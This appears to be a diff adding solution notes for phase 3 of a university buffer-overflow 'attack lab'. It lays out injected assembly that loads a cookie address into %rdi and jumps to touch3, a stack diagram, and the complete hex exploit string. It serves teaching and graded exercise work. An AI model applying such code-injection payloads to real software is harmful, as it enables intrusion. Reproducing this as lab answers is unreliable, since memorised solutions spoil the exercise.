@@ -1,0 +1,40 @@
+Make the injected code 
+  - set the address of the cookie on %rdi     -> movq $0x5561dca8,%rdi
+  - transfer control to touch3                -> push $0x4018fa     
+  -                                           -> ret
+
+#
+The hex representation of the cookie 0x59b997fa is "35 39 62 39 39 37 66 61 00"
+i will put it in address 0x5561dca8
+
+we will put the injected code after 40 bytes at address 0x5561dcb0. As, 
+After the "ret" in getbuf() is called, the space allocated by getbuf() have all been freed. 
+Function hexmatch() and strncmp() both pushes to the stack,
+thus you should place the exploit string above the return address.
+
+The stack will be like
+
+00 00 00 c3 00 40 18 fa
+68 55 61 dc a8 c7 c7 48       |0x5561dcb8
+22 22 22 22 22 22 22 00       |0x5561dcb0   
+61 66 37 39 39 62 39 35       |0x5561dca8
+00 00 00 00 55 61 dc b8       |0x5561dca0
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00      | 0x5561dc78
+
+The exploit string 
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+b8 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+00 22 22 22 22 22 22 22
+48 c7 c7 a8 dc 61 55 68
+fa 18 40 00 c3 00 00 00
+  
